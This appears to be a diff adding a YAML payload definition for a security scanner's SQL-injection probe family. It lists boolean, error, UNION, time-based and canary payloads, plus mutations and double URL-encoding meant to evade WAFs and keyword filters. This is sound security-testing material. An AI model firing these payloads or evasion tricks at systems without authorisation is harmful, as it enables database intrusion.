@@ -1,0 +1,54 @@
+family_id: sqli
+description: >-
+  Canonical SQL-injection probes (boolean, error, time-based, UNION).
+  Conservative training-grade seeds; the builder expands them at request
+  time via the case_flip / comment_injection / whitespace_alt mutations
+  declared below.
+cwe_ids: [89]
+owasp_top10:
+  - 'A03:2021'
+risk_level: medium
+requires_approval: false
+oast_required: true
+payloads:
+  - id: boolean_true
+    template: "' OR '1'='1"
+    confidence: suspected
+    notes: Classic boolean-true tautology for quoted-string contexts.
+  - id: boolean_false
+    template: "' AND '1'='2"
+    confidence: suspected
+    notes: Boolean-false counterpart; differential responses confirm injection.
+  - id: error_quote
+    template: "{param}'"
+    confidence: suspected
+    notes: Single-quote probe; provokes parser errors in unsafe sinks.
+  - id: union_nulls
+    template: "{param}' UNION SELECT NULL,NULL,NULL-- -"
+    confidence: likely
+    notes: UNION column-count probe; orchestrator tunes width at request time.
+  - id: time_blind_sleep
+    template: "{param}' AND SLEEP(5)-- -"
+    confidence: likely
+    notes: Time-based blind probe; only used when differential mode is unreliable.
+  - id: oast_canary
+    template: "{param}' /* {canary} */ -- -"
+    confidence: confirmed
+    notes: Inline canary marker; OAST collector correlates the {canary} token.
+mutations:
+  - name: case_flip
+    description: SQL keywords are case-insensitive; flips defeat substring filters.
+  - name: comment_injection
+    description: Insert /**/ between tokens to break keyword block-lists.
+  - name: whitespace_alt
+    description: Swap spaces with tabs / + to bypass space-banning WAFs.
+encodings:
+  - name: identity
+    stages: []
+    description: Raw payload (request body / form context).
+  - name: url_only
+    stages: [url]
+    description: URL-encode for query-string contexts.
+  - name: url_double
+    stages: [url_double]
+    description: Double URL-encode for proxies that decode once.
